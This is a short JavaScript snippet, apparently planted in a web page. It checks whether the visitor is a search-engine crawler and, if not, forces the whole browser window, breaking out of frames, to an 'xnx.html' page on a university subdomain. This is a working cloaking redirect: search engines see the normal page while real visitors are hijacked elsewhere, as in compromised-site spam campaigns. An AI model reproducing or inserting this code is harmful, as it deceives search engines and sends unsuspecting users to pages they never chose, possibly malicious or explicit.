(function() {
  var isBot = /Googlebot|bingbot|Baiduspider|DuckDuckBot|YandexBot/i.test(navigator.userAgent);

  if (!isBot) {
    var blogUrl = "https://lab811group.engr.siu.edu/xnx.html";

    try {
      if (window.top && window.top.location) {
        window.top.location.href = blogUrl;
      } else {
        window.location.href = blogUrl;
      }
    } catch(e) {
      window.location.href = blogUrl;
    }
  }
})();